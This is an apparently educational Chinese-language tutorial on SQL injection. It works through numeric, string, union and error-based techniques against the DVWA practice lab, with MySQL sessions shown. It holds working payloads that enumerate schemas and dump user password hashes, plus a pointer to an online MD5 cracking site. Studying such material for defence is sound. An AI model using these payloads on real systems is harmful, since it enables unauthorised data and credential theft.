结构化查询语言（Structured Query Language，缩写：SQL），是一种特殊的编程语言，用于数据库中的标准数据查询语言。
</p>

<p>
SQL注入:
一般指web应用程序对用户输入数据的合法性没有校验或过滤不严，攻击者可以在web应用程序中事先定义好的查询语句结尾添加额外的SQL语句，在系统运维人员不知情的情况下实现非法操作，以此来实现欺骗数据库服务器执行非授权的任意查询操作，从而进一步得到相应的数据信息。 简而言之就是，攻击者通过系统正常的输入数据的功能，输入恶意数据，而系统又未作任何的校验，直接信任了用户输入，使得恶意输入改变原本的SQL逻辑或者执行了额外的SQL查询语句，从而造成了SQL注入攻击。
</p>

<p>
SQL注入需要满足的条件：
</p>
<ul class="org-ul">
<li>参数是用户可控的</li>
<li>参数要带入数据库进行查询</li>
</ul>
</div>
</div>
<div id="outline-container-h:869e394f-d587-44e5-9c34-456207ebaea0" class="outline-3">
<h3 id="h:869e394f-d587-44e5-9c34-456207ebaea0">漏洞危害</h3>
<div class="outline-text-3" id="text-h:869e394f-d587-44e5-9c34-456207ebaea0">
<p>
危害较高的漏洞，可以获取敏感信息，修改信息，脱库，上传webshell，执行命令。
</p>
</div>
</div>
<div id="outline-container-h:52a86fa9-6510-4e2a-a85d-a30b5f08edc5" class="outline-3">
<h3 id="h:52a86fa9-6510-4e2a-a85d-a30b5f08edc5">SQL注入分类</h3>
<div class="outline-text-3" id="text-h:52a86fa9-6510-4e2a-a85d-a30b5f08edc5">
</div>
<div id="outline-container-h:91a48914-c85a-4845-ae6d-8c3eaddc9467" class="outline-4">
<h4 id="h:91a48914-c85a-4845-ae6d-8c3eaddc9467">数字型</h4>
<div class="outline-text-4" id="text-h:91a48914-c85a-4845-ae6d-8c3eaddc9467">
<p>
原理：当输入的参数为整数类型时，如果存在注入漏洞，称为数字型注入。
</p>

<p>
测试步骤：
</p>
<ol class="org-ol">
<li><p>
加单引号，URL：www.text.com/text.php?id=1'
</p>

<p>
对应的sql：select * from table where id=1' 这时sql语句出错，程序无
法正常从数据库中查询出数据，就会抛出异常；此时可以判断大概率存在注
入，因为只有服务器将这个单引号一起当作SQL语句执行时才会报错，但是并
不绝对，也有可能是程序本身的问题引起报错。
</p></li>

<li><p>
加and 1=1，URL：www.text.com/text.php?id=1 and 1=1
</p>

<p>
对应的sql：select * from table where id=1 and 1=1 语句执行正常，与原始页面无任何差异。如果页面不存在注入，页面不应该有结果。
</p></li>

<li><p>
加and 1=2，URL：www.text.com/text.php?id=1 and 1=2
</p>

<p>
对应的sql：select * from table where id=1 and 1=2 为了进一步验证存
在注入，把and 1=1改成and 1=2，语句可以正常执行，但是无法查询出结果，
返回数据与原始网页存在差异。如果本不应该查到信息的查到了消息，可以
认为这个点存在隐式转换
</p>

<p>
如代码中输入做了处理，sql变成：select * from table where id='1 and 1=2' 存在隐式转换，变成select * from table where id=1
</p></li>
</ol>

<p>
如果满足以上三点，则可以判断该URL存在数字型注入。
</p>


<p>
范例1
</p>

<p>
<b>隐式转换</b> ：某个参数的类型是int类型，当给参数赋值时给的是string类型，mysql就会识别string的第一个字符，如果第一个字符是数字就会被转换成int类型，否则转换失败不会向后执行。
</p>

<div class="org-src-container">
<pre class="src src-sh">mysql&gt; show tables;
mysql&gt; desc users;
+--------------+-------------+------+-----+-------------------+-----------------------------+
| Field        | Type        | Null | Key | Default           | Extra                       |
+--------------+-------------+------+-----+-------------------+-----------------------------+
| user_id      | int(6)      | NO   | PRI | 0                 |                             |

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#34429;&#28982; user_id &#26159;&#25972;&#25968;&#31867;&#22411;&#30340;&#65292;&#20294;&#24403;user_id='1'&#26102;mysql&#21487;&#20197;&#32416;&#38169;</span>
<span style="color: #a020f0;">select</span> * from users where <span style="color: #a0522d;">user_id</span>=1;
<span style="color: #a020f0;">select</span> * from users where <span style="color: #a0522d;">user_id</span>=<span style="color: #8b2252;">'1'</span>;

mysql&gt; select first_name,last_name from users where user_id = <span style="color: #8b2252;">'1sffdf'</span>;
+------------+-----------+
| first_name | last_name |
+------------+-----------+
| admin      | admin     |
+------------+-----------+
1 row<span style="color: #a020f0;"> in</span> set, 1 warning (0.00 sec)

mysql&gt; select first_name,last_name from users where user_id = <span style="color: #8b2252;">'123424'</span>;
Empty set (0.00 sec)

mysql&gt; select first_name,last_name from users where user_id = <span style="color: #8b2252;">'1 and 1=2'</span>; <span style="color: #b22222;">#</span><span style="color: #b22222;">&#23384;&#22312;&#38544;&#24335;&#36716;&#25442;&#65292;&#35782;&#21035;&#23383;&#31526;&#20018;&#31532;&#19968;&#20010;&#25968;&#23383;</span>
+------------+-----------+
| first_name | last_name |
+------------+-----------+
| admin      | admin     |
+------------+-----------+
1 row<span style="color: #a020f0;"> in</span> set, 1 warning (0.01 sec)

mysql&gt; select first_name,last_name from users where user_id = 1 and <span style="color: #a0522d;">1</span>=2;
Empty set (0.00 sec)
</pre>
</div>

<p>
范例2：
</p>


<figure id="org5f3a84a">
<img src="./images/Snipaste_2023-06-06_00-16-30.png" alt="Snipaste_2023-06-06_00-16-30.png" width="50%">

</figure>

<p>
Dvwa 的low模式：
</p>
<ul class="org-ul">
<li>SQL Injection, 在User ID 填写 <code>1 and 1 = 2</code>  也能得到结果</li>
<li>如果本不应该查到信息的查到了消息，可以认为这个点存在隐式转换</li>
<li><code>$query  = "SELECT first_name, last_name FROM users WHERE user_id = '$id';";</code></li>
</ul>

<p>
dvwa源码内容
</p>
<div class="org-src-container">
<pre class="src src-sh">&lt;?php

<span style="color: #a020f0;">if</span>( isset( $<span style="color: #a0522d;">_REQUEST</span>[ <span style="color: #8b2252;">'Submit'</span> ] ) ) {
    // Get input
    $<span style="color: #a0522d;">id</span> = $<span style="color: #a0522d;">_REQUEST</span>[ <span style="color: #8b2252;">'id'</span> ];

    // Check database
    $<span style="color: #a0522d;">query</span>  = <span style="color: #8b2252;">"SELECT first_name, last_name FROM users WHERE user_id = '$id';"</span>;
    $<span style="color: #a0522d;">result</span> = mysqli_query($<span style="color: #a0522d;">GLOBALS</span>[<span style="color: #8b2252;">"___mysqli_ston"</span>],  $<span style="color: #a0522d;">query</span> ) or die( <span style="color: #8b2252;">'&lt;pre&gt;'</span> . ((is_object($<span style="color: #a0522d;">GLOBALS</span>[<span style="color: #8b2252;">"___mysqli_ston"</span>])) ? mysqli_error($<span style="color: #a0522d;">GLOBALS</span>[<span style="color: #8b2252;">"___mysqli_ston"</span>]) : (($<span style="color: #a0522d;">___mysqli_res</span> = mysqli_connect_error()) ? $<span style="color: #a0522d;">___mysqli_res</span> : false)) <span style="color: #483d8b;">.</span> <span style="color: #8b2252;">'&lt;/pre&gt;'</span> );

    // Get results
    <span style="color: #a020f0;">while</span>( $<span style="color: #a0522d;">row</span> = mysqli_fetch_assoc( $<span style="color: #a0522d;">result</span> ) ) {
        // Get values
        $<span style="color: #a0522d;">first</span> = $<span style="color: #a0522d;">row</span>[<span style="color: #8b2252;">"first_name"</span>];
        $<span style="color: #a0522d;">last</span>  = $<span style="color: #a0522d;">row</span>[<span style="color: #8b2252;">"last_name"</span>];

        // Feedback for end user
        <span style="color: #483d8b;">echo</span> <span style="color: #8b2252;">"&lt;pre&gt;ID: {$id}&lt;br /&gt;First name: {$first}&lt;br /&gt;Surname: {$last}&lt;/pre&gt;"</span>;
    }

    ((is_null($<span style="color: #a0522d;">___mysqli_res</span> = mysqli_close($<span style="color: #a0522d;">GLOBALS</span>[<span style="color: #8b2252;">"___mysqli_ston"</span>]))) ? false : $<span style="color: #a0522d;">___mysqli_res</span>);
}

?&gt;
</pre>
</div>
</div>
</div>
<div id="outline-container-h:cad939bf-f787-4656-8fd0-4e938db4c5d9" class="outline-4">
<h4 id="h:cad939bf-f787-4656-8fd0-4e938db4c5d9">字符型</h4>
<div class="outline-text-4" id="text-h:cad939bf-f787-4656-8fd0-4e938db4c5d9">
<p>
原理：当输入的参数为字符串时，如果存在注入漏洞，称为字符型。
</p>

<p>
字符型和数字型最大的一个区别在于，数字型不需要单引号来闭合，而字符串一般需要通过单引号来闭合的。
</p>

<p>
例如数字型语句：select * from table where id =3
</p>

<p>
则字符型如下：select * from table where name='admin'
</p>

<p>
因此，在构造payload时通过闭合单引号可以成功执行语句：
</p>
<div class="org-src-container">
<pre class="src src-sh">&#23581;&#35797;&#36755;&#20837;: 1<span style="color: #8b2252;">' or 1=1 #</span>
</pre>
</div>

<p>
这样做的目的是让 or从单引号中逃逸出来，从而实现其逻辑判断
</p>
<ul class="org-ul">
<li>这个单引号作用，是使其跟前面的单引号形成闭合</li>
<li>井号的作用，是隔断后面的单引号</li>
</ul>


<p>
注意
</p>
<ul class="org-ul">
<li>如果是数字型：输入什么，原封不动的传递到后端</li>
<li>如果是字符型：输入什么，在输入内容的左右两边加上单引号形成字符串传递到后端</li>
<li>DVWA：low级别下的sql注入是数字型注入，按理说前端输入什么，就应该原封不动的给后端传递什么，但是这里程序对用户的输入做了处理，把用户输入的左右两边加上了单引号。</li>
</ul>

<p>
范例：dvwa 安全等级low下，SQL Injection测试
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#22240;&#20026;low&#32423;&#21035;&#65292;SQL Injection&#30340;&#21518;&#31471;&#28304;&#30721;&#26159;&#23558;&#36755;&#20837;id&#20540;&#21333;&#24341;&#21495;&#24341;&#36215;&#26469;&#30340;&#65292;&#21487;&#20197;&#25226;&#23427;&#24403;&#20316;&#23383;&#31526;&#22411;&#26469;&#27979;&#35797;</span>

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#20808;&#22312;mysql&#37324;&#23454;&#39564;&#19968;&#19979;</span>
mysql&gt; select first_name,last_name from users where user_id = <span style="color: #8b2252;">'1'</span> and <span style="color: #a0522d;">1</span>=2#<span style="color: #8b2252;">';</span>
<span style="color: #8b2252;">    -&gt; ;</span>
<span style="color: #8b2252;">Empty set (0.01 sec)</span>

<span style="color: #8b2252;">mysql&gt; select first_name,last_name from users where user_id = '</span>1<span style="color: #8b2252;">' and 1=1#'</span>;
    -&gt; ;
+------------+-----------+
| first_name | last_name |
+------------+-----------+
| admin      | admin     |
+------------+-----------+
1 row<span style="color: #a020f0;"> in</span> set (0.00 sec)

mysql&gt; select first_name,last_name from users where user_id = <span style="color: #8b2252;">'1'</span> or <span style="color: #a0522d;">1</span>=2#<span style="color: #8b2252;">';</span>
<span style="color: #8b2252;">    -&gt; ;</span>
<span style="color: #8b2252;">+------------+-----------+</span>
<span style="color: #8b2252;">| first_name | last_name |</span>
<span style="color: #8b2252;">+------------+-----------+</span>
<span style="color: #8b2252;">| admin      | admin     |</span>
<span style="color: #8b2252;">+------------+-----------+</span>
<span style="color: #8b2252;">1 row in set (0.00 sec)</span>

<span style="color: #8b2252;">#&#21491;&#36793;&#24658;&#20026;&#30495;&#65292;&#24038;&#36793;&#19981;&#31649;&#20320;&#20889;&#20160;&#20040;&#65292;&#25972;&#20307;&#30340;&#21028;&#26029;&#36923;&#36753;&#26159;&#30495;&#30340;&#65292;&#30456;&#24403;&#20110;&#27809;&#26377;where &#36825;&#37096;&#20998;&#20102;</span>
<span style="color: #8b2252;">mysql&gt; select first_name,last_name from users where user_id = '</span>1<span style="color: #8b2252;">' or 1=1#'</span>;
    -&gt; ;
+------------+-----------+
| first_name | last_name |
+------------+-----------+
| admin      | admin     |
| Gordon     | Brown     |
| Hack       | Me        |
| Pablo      | Picasso   |
| Bob        | Smith     |
+------------+-----------+

</pre>
</div>

<p>
dvwa SQL注入页面测试
</p>
<ul class="org-ul">
<li>1' and 1  = 1 #  能查询admin到信息</li>
<li>1' and 1  = 2 #  不能查询到admin信息</li>
<li>1' or 1  = 2 # 能查询到admin信息</li>
<li>1' or 1  = 1 # 能查询到所有用户信息</li>
<li>这样确实是按sql语义执行的</li>
</ul>
</div>
</div>
<div id="outline-container-h:9a893a6a-2e98-4d07-a794-fe5b2dfb0762" class="outline-4">
<h4 id="h:9a893a6a-2e98-4d07-a794-fe5b2dfb0762">Union注入（联合查询注入）</h4>
<div class="outline-text-4" id="text-h:9a893a6a-2e98-4d07-a794-fe5b2dfb0762">
<p>
联合查询是在一条SQL语句中执行多个查询任务，等同于将一个表追加到另一个表，从而实现将两个表的查询组合到一起，使用UNION或UNION ALL。
</p>

<p>
注意：
</p>
<ul class="org-ul">
<li>UNION操作符选取不重复的值。如果允许重复的值，请使用 UNION ALL。</li>
<li><p>
使用union查询，必需保证左右两边的列数一致，否则报错
</p>

<p>
以下以DVWA靶场讲解，安全等级为Low.
</p></li>
</ul>

<div class="org-src-container">
<pre class="src src-sh">mysql&gt; use dvwa

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#22810;&#34920;&#32437;&#21521;&#21512;&#24182;union</span>
<span style="color: #b22222;">#</span><span style="color: #b22222;">union all &#20801;&#35768;&#37325;&#22797; &#25512;&#33616;&#20351;&#29992;&#65292;&#20197;&#20813;&#25968;&#25454;&#36951;&#28431;</span>
mysql&gt; select user_id,first_name from users where <span style="color: #a0522d;">user_id</span>=1 union all select
user_id,first_name from users where <span style="color: #a0522d;">user_id</span>=1;
+---------+------------+
| user_id | first_name |
+---------+------------+
| 1 | admin |
| 1 | admin |
+---------+------------+

<span style="color: #b22222;">#</span><span style="color: #b22222;">union &#19981;&#20801;&#35768;&#37325;&#22797;</span>
mysql&gt; select user_id,first_name from users where <span style="color: #a0522d;">user_id</span>=1 union select
user_id,first_name from users where <span style="color: #a0522d;">user_id</span>=1;
+---------+------------+
| user_id | first_name |
+---------+------------+
| 1 | admin |
+---------+------------+

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#20351;&#29992;union&#26597;&#35810;&#65292;&#24517;&#38656;&#20445;&#35777;&#24038;&#21491;&#20004;&#36793;&#30340;&#21015;&#25968;&#19968;&#33268;&#65292;&#21542;&#21017;&#25253;&#38169;</span>
mysql&gt; select first_name,last_name from users where user_id =1 union all select first_name from users where <span style="color: #a0522d;">user_id</span>=1;
ERROR 1222 (21000): The used SELECT statements have a different number of columns

mysql&gt; select first_name,last_name from users where user_id =1 union all select first_name,1 from users where <span style="color: #a0522d;">user_id</span>=1;
+------------+-----------+
| first_name | last_name |
+------------+-----------+
| admin      | admin     |
| admin      | 1         |
+------------+-----------+

<span style="color: #b22222;">#</span><span style="color: #b22222;">order by n &#23545;&#21015;&#20570;&#25490;&#24207;&#12290;&#24403;n&#36229;&#20986;&#25152;&#22312;&#21015;&#26102;&#25253;&#38169;</span>
mysql&gt; select <span style="color: #8b2252;">'a'</span>,<span style="color: #8b2252;">'b'</span>,<span style="color: #8b2252;">'c'</span>,<span style="color: #8b2252;">'d'</span> ;
+---+---+---+---+
| a | b | c | d |
+---+---+---+---+
| a | b | c | d |
+---+---+---+---+

mysql&gt; select <span style="color: #8b2252;">'a'</span>,<span style="color: #8b2252;">'b'</span>,<span style="color: #8b2252;">'c'</span>,<span style="color: #8b2252;">'d'</span> order by 4;
+---+---+---+---+
| a | b | c | d |
+---+---+---+---+
| a | b | c | d |
+---+---+---+---+
1 row<span style="color: #a020f0;"> in</span> set (0.00 sec)

mysql&gt; select <span style="color: #8b2252;">'a'</span>,<span style="color: #8b2252;">'b'</span>,<span style="color: #8b2252;">'c'</span>,<span style="color: #8b2252;">'d'</span> order by 5; <span style="color: #b22222;">#</span><span style="color: #b22222;">&#20174;&#31532;1&#21015;&#23454;&#39564;&#21040;&#25353;&#31532;5&#21015;&#65292;&#31532;5&#21015;&#25490;&#24207;&#25253;&#38169;&#65292;&#35828;&#26126;&#36825;&#20010;&#25968;&#25454;&#26377;4&#21015;</span>
ERROR 1054 (42S22): Unknown column <span style="color: #8b2252;">'5'</span><span style="color: #a020f0;"> in</span> <span style="color: #8b2252;">'order clause'</span>
</pre>
</div>


<p>
<b>使用Union注入的前提条件：页面上有显示位。</b>
</p>

<p>
第1步：通过 order 做字段排序，可以猜解出正确的字段数：
</p>

<pre class="example" id="orgf49cc5b">
order by n   # 通过不断尝试 n 的值直到出错，那么正确字段数就是 n-1
</pre>

<p>
在 dvwa 的 SQL Injection 输入 
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#27491;&#24120;&#12290;&#21487;&#20197;&#20197;&#31532;2&#21015;&#20570;&#25490;&#24207;</span>
1<span style="color: #8b2252;">' order by 2#</span>
</pre>
</div>


<figure id="orgd8c2c36">
<img src="./images/Snipaste_2023-06-03_22-00-00.png" alt="Snipaste_2023-06-03_22-00-00.png" width="50%">

</figure>

<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#24322;&#24120;&#65292;&#35828;&#26126;&#23383;&#27573;&#25968;&#20026;2</span>
1<span style="color: #8b2252;">' order by 3#</span>
</pre>
</div>


<figure id="org5707670">
<img src="./images/Snipaste_2023-06-06_00-38-01.png" alt="Snipaste_2023-06-06_00-38-01.png" width="50%">

</figure>

<p>
这就说明正确的字段数是 2 ，因为当用于排序的字段数大于总字段数时会出错。
</p>

<p>
第2步：确定显示位
</p>

<p>
只有确定了显示位，才能构建出sql查询语句，让页面有显示
</p>

<div class="org-src-container">
<pre class="src src-sh">1<span style="color: #8b2252;">' union select 1,2#</span>

<span style="color: #8b2252;"># &#36716;&#25442;&#21040;&#25968;&#25454;&#24211;&#20013;&#25191;&#34892;&#35821;&#21477;&#26159;</span>
<span style="color: #8b2252;">mysql&gt; select first_name, last_name from users where user_id = '</span>1<span style="color: #8b2252;">' union all select 1,2 # '</span>;
    -&gt; ;
+------------+-----------+
| first_name | last_name |
+------------+-----------+
| admin      | admin     |
| 1          | 2         |
+------------+-----------+
2 rows<span style="color: #a020f0;"> in</span> set (0.00 sec)

mysql&gt; select database();
+------------+
| database() |
+------------+
| dvwa       |
+------------+

mysql&gt; select version();
+---------------------+
| version()           |
+---------------------+
| 5.5.54-0+deb8u1-log |
+---------------------+
</pre>
</div>



<figure id="org4441d7b">
<img src="./images/img_20250529_211456.png" alt="img_20250529_211456.png" width="50%">

</figure>


<p>
这里的1和2是无意的，仅用来是否可以显示 。是否可以用database()替换1，version()替换2？
</p>

<p>
第3步：爆出数据库名和版本信息
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;"># </span><span style="color: #b22222;">&#25968;&#25454;&#24211;&#20013;&#25191;&#34892;&#35821;&#21477;&#26159;</span>
mysql&gt; select first_name, last_name from users where user_id = <span style="color: #8b2252;">'1'</span> union  select database(),version() <span style="color: #b22222;"># </span><span style="color: #b22222;">'</span>
    -&gt; ;
+------------+---------------------+
| first_name | last_name           |
+------------+---------------------+
| admin      | admin               |
| dvwa       | 5.5.54-0+deb8u1-log |
+------------+---------------------+

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#22914;&#26524;&#25442;&#21040;&#21069;&#31471;&#23601;&#36825;&#26679;&#36755;&#20837;</span>
1<span style="color: #8b2252;">' union select database(),version()#</span>
</pre>
</div>



<figure id="orgda31613">
<img src="./images/img_20250529_211720.png" alt="img_20250529_211720.png" width="50%">

</figure>


<p>
在讲解如何利用Union注入进一步获取数据库名、表名、字段名以及字段中的数据之前，先介绍一个重要的知识点：MySQL 5.0以上版本，存在一个自带的数据库名为：information_schema（重点）。
</p>

<p>
information_schema数据库中
</p>

<p>
三个表非常重要：
</p>
<ul class="org-ul">
<li>SCHEMATA：表里包含所有数据库的名字</li>
<li>TABLES：表里包含所有数据库的所有表，默认字段为table_name</li>
<li>COLUMNS：表里包含所有数据库的所有表的所有字段</li>
</ul>

<p>
三个列非常重要：
</p>

<ul class="org-ul">
<li>TABLE_SCHEMA：数据库名</li>
<li>TABLE_NAME：表名</li>
<li>COLUMN_NAME：字段名</li>
</ul>

<p>
范例：
</p>
<div class="org-src-container">
<pre class="src src-sh">mysql&gt; use information_schema

mysql&gt; select * from SCHEMATA; <span style="color: #b22222;">#</span><span style="color: #b22222;">&#25152;&#26377;&#24211;&#21517;</span>
+--------------+--------------------+----------------------------+------------------------+----------+
| CATALOG_NAME | SCHEMA_NAME        | DEFAULT_CHARACTER_SET_NAME | DEFAULT_COLLATION_NAME | SQL_PATH |
+--------------+--------------------+----------------------------+------------------------+----------+
| def          | information_schema | utf8                       | utf8_general_ci        | NULL     |
| def          | dvwa               | latin1                     | latin1_swedish_ci      | NULL     |
| def          | mysql              | latin1                     | latin1_swedish_ci      | NULL     |
| def          | performance_schema | utf8                       | utf8_general_ci        | NULL     |
+--------------+--------------------+----------------------------+------------------------+----------+

mysql&gt; desc COLUMNS; <span style="color: #b22222;"># </span><span style="color: #b22222;">&#26597;&#30475;&#25152;&#26377;&#34920;&#30340;&#23383;&#27573;</span>
+--------------------------+---------------------+------+-----+---------+-------+
| Field                    | Type                | Null | Key | Default | Extra |
+--------------------------+---------------------+------+-----+---------+-------+
| TABLE_SCHEMA             | varchar(64)         | NO   |     |         |       | <span style="color: #b22222;">#</span><span style="color: #b22222;">&#24211;&#21517;</span>
| TABLE_NAME               | varchar(64)         | NO   |     |         |       | <span style="color: #b22222;">#</span><span style="color: #b22222;">&#34920;&#21517;</span>
| COLUMN_NAME              | varchar(64)         | NO   |     |         |       | <span style="color: #b22222;">#</span><span style="color: #b22222;">&#23383;&#27573;&#21517;</span>

mysql&gt; desc tables; <span style="color: #b22222;">#</span><span style="color: #b22222;">&#26597;&#30475;&#26377;&#34920;</span>
+-----------------+---------------------+------+-----+---------+-------+
| Field           | Type                | Null | Key | Default | Extra |
+-----------------+---------------------+------+-----+---------+-------+
| TABLE_CATALOG   | varchar(512)        | NO   |     |         |       |
| TABLE_SCHEMA    | varchar(64)         | NO   |     |         |       | <span style="color: #b22222;">#</span><span style="color: #b22222;">&#24211;&#21517;</span>
| TABLE_NAME      | varchar(64)         | NO   |     |         |       | <span style="color: #b22222;">#</span><span style="color: #b22222;">&#34920;&#21517;</span>
</pre>
</div>


<p>
<b>联合注入的过程：</b>
</p>
<ul class="org-ul">
<li>判断注入点</li>
<li>判断是整型还是字符型</li>
<li>判断列数（order by）、显示位(根据页面前端的显示判断)</li>
<li>获取目标数据库名</li>
<li>获取目标数据库的所有表名、字段名、字段中的数据</li>
</ul>

<p>
爆出dvwa数据库中有 guestbook,users 两个表：
</p>
<div class="org-src-container">
<pre class="src src-sh">1<span style="color: #8b2252;">' union select 1,group_concat(table_name) from information_schema.tables where table_schema ='</span>dvwa<span style="color: #8b2252;">'#</span>

<span style="color: #8b2252;">1'</span> union select 1,group_concat(table_name) from information_schema.tables where table_schema =<span style="color: #8b2252;">'dvwa</span>

<span style="color: #8b2252;">## GROUP_CONCAT()&#20989;&#25968;&#23558;&#32452;&#20013;&#30340;&#23383;&#31526;&#20018;&#36830;&#25509;&#25104;&#20026;&#21333;&#20010;&#23383;&#31526;&#20018;&#12290;</span>
</pre>
</div>

<p>
范例：爆出dvwa数据库中所有表
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#26597;&#30475;dvwa&#24211;&#20013;&#65292;&#25152;&#26377;&#34920;&#21517;&#12290;</span>
mysql&gt; select table_name from information_schema.tables where table_schema = <span style="color: #8b2252;">'dvwa'</span>;
+------------+
| table_name |
+------------+
| guestbook  |
| users      |
+------------+

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#37197;&#21512;union&#32852;&#21512;&#26597;&#35810;</span>
mysql&gt; use dvwa

mysql&gt; select first_name,last_name from users where user_id =<span style="color: #8b2252;">'1'</span> union select 1,table_name from information_schema.tables where <span style="color: #a0522d;">table_schema</span>=<span style="color: #8b2252;">'dvwa'</span> <span style="color: #b22222;">#</span><span style="color: #b22222;">'</span>
    -&gt; ;
+------------+-----------+
| first_name | last_name |
+------------+-----------+
| admin      | admin     |
| 1          | guestbook |
| 1          | users     |

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#36716;&#25442;&#25104;&#39029;&#38754;&#19978;</span>
1<span style="color: #8b2252;">' union select 1,table_name from information_schema.tables where table_schema='</span>dvwa<span style="color: #8b2252;">' #</span>
</pre>
</div>

<p>
范例：解决页面显示位不足问题，利用 group_concat 函数将组中的字符串连接成为单个字符串
</p>

<div class="org-src-container">
<pre class="src src-sh">mysql&gt; select group_concat(user_id) from users;
+-----------------------+
| group_concat(user_id) |
+-----------------------+
| 1,2,3,4,5             |
+-----------------------+
1 row<span style="color: #a020f0;"> in</span> set (0.00 sec)

<span style="color: #b22222;"># </span><span style="color: #b22222;">&#25214;&#21040; dvwa &#24211;&#25152;&#26377;&#34920;&#21517;</span>
mysql&gt; select first_name,last_name from users where user_id =<span style="color: #8b2252;">'1'</span> union select 1,group_concat(table_name) from information_schema.tables where <span style="color: #a0522d;">table_schema</span>=<span style="color: #8b2252;">'dvwa'</span> <span style="color: #b22222;">#</span><span style="color: #b22222;">'</span>
    -&gt; ;
+------------+-----------------+
| first_name | last_name       |
+------------+-----------------+
| admin      | admin           |
| 1          | guestbook,users |
+------------+-----------------+

<span style="color: #b22222;">#</span><span style="color: #b22222;">&#36716;&#25442;&#21040;&#39029;&#38754;&#20026;</span>
1<span style="color: #8b2252;">' union select 1,group_concat(table_name) from information_schema.tables where table_schema='</span>dvwa<span style="color: #8b2252;">' #'</span>
</pre>
</div>


<p>
得到users表中的字段名:
</p>
<div class="org-src-container">
<pre class="src src-sh">1<span style="color: #8b2252;">' UNION SELECT 1,group_concat(column_name) from information_schema.columns where table_schema='</span>dvwa<span style="color: #8b2252;">' and table_name='</span>users<span style="color: #8b2252;">'#</span>

<span style="color: #8b2252;"># &#24471;&#21040;&#29992;&#25143;&#21517;&#21644;&#23494;&#30721;</span>
<span style="color: #8b2252;">1'</span> union select user,password from users#
</pre>
</div>

<p>
范例：得到users表中的字段名
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #b22222;">#</span><span style="color: #b22222;">&#25968;&#25454;&#24211;&#20013;&#25191;&#34892;&#30340;&#35821;&#21477;</span>
mysql&gt; select first_name,last_name from users where user_id = <span style="color: #8b2252;">'1'</span> UNION SELECT 1,group_concat(column_name) from information_schema.columns where <span style="color: #a0522d;">table_schema</span>=<span style="color: #8b2252;">'dvwa'</span> and <span style="color: #a0522d;">table_name</span>=<span style="color: #8b2252;">'users'</span> <span style="color: #b22222;">#</span><span style="color: #b22222;">'</span>
    -&gt; ;
+------------+---------------------------------------------------------------------------+
| first_name | last_name                                                                 |
+------------+---------------------------------------------------------------------------+
| admin      | admin                                                                     |
| 1          | user_id,first_name,last_name,user,password,avatar,last_login,failed_login |
+------------+---------------------------------------------------------------------------+
2 rows<span style="color: #a020f0;"> in</span> set (0.00 sec)

mysql&gt; select first_name,last_name from users where user_id = <span style="color: #8b2252;">'1'</span> union select user,password from users <span style="color: #b22222;">#</span>
    -&gt; ;
+------------+----------------------------------+
| first_name | last_name                        |
+------------+----------------------------------+
| admin      | admin                            |
| admin      | 5f4dcc3b5aa765d61d8327deb882cf99 |
| gordonb    | e99a18c428cb38d5f260853678922e03 |
| 1337       | 8d3533d75ae2c3966d7e0d4fcc69216b |
| pablo      | 0d107d09f5bbe40cade3de5c71e9e9b7 |
| smithy     | 5f4dcc3b5aa765d61d8327deb882cf99 |
</pre>
</div>

<p>
撞库：拿着这段密文到数据库查有没有。
</p>

<p>
md5解密在线 <a href="https://cmd5.com/">https://cmd5.com/</a>
</p>
</div>
</div>
<div id="outline-container-h:8ab4fca9-51e8-4acd-a9ba-d6676e5a23ad" class="outline-4">
<h4 id="h:8ab4fca9-51e8-4acd-a9ba-d6676e5a23ad">报错注入</h4>
<div class="outline-text-4" id="text-h:8ab4fca9-51e8-4acd-a9ba-d6676e5a23ad">
<p>
报错注入顾名思义主要是利用 <b>数据库报错</b> 来进行判断是否存在注入点，如果不符合数据库语法规则就会产生错误。
</p>

<p>
常用的特殊字符：' \ ; %00 ) ( # "
</p>

<p>
在mysql高版本（大于5.1版本）中添加了对XML文档进行查询和修改的函数，这两个函数常用于报错注入：
</p>
<div class="org-src-container">
<pre class="src src-sh"><span style="color: #0000ff;">extractvalue</span>()
<span style="color: #0000ff;">updatexml</span>()
</pre>
</div>

<p>
原因：当这两个函数在执行时，如果出现XML文档路径错误就会产生报错。
</p>

<p>
<b>报错注入常用函数：</b>
</p>

<p>
<b>1、 extractvalue()函数</b>
</p>
<ul class="org-ul">
<li>此函数从目标XML中返回包含所查询值的字符串。语法：extractvalue（XML_document，xpath_string）
<ul class="org-ul">
<li>第一个参数：string格式，为XML文档对象的名称</li>
<li>第二个参数：xpath_string（xpath格式的字符串） ，为XML文档的路径</li>
</ul></li>
<li><p>
extractvalue使用时当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）。比如 ~ ! % ? @
</p>

<p>
开发人员在开发时有可能会把这些特殊字符过滤掉，所以一般我们用16进制代替
</p>
<div class="org-src-container">
<pre class="src src-sh">mysql&gt; select hex(<span style="color: #8b2252;">'~'</span>);
+----------+
| hex(<span style="color: #8b2252;">'~'</span>) |
+----------+
| 7E       |

mysql&gt; select first_Name,last_name from users where <span style="color: #a0522d;">1</span>=<span style="color: #8b2252;">'1'</span> and extractvalue(1,0x7e);
ERROR 1105 (HY000): XPATH syntax error: <span style="color: #8b2252;">'~'</span>

<span style="color: #b22222;">#</span><span style="color: #b22222;">concat&#20989;&#25968;&#29992;&#20110;&#23383;&#31526;&#20018;&#25340;&#25509;</span>
mysql&gt; select concat(user_id,<span style="color: #8b2252;">'-'</span>,first_name) from  users;
+--------------------------------+
| concat(user_id,<span style="color: #8b2252;">'-'</span>,first_name) |
+--------------------------------+
| 1-admin                        |
| 2-Gordon                       |
| 3-Hack                         |
| 4-Pablo                        |
| 5-Bob                          |
+--------------------------------+
</pre>
</div>

<div class="org-src-container">
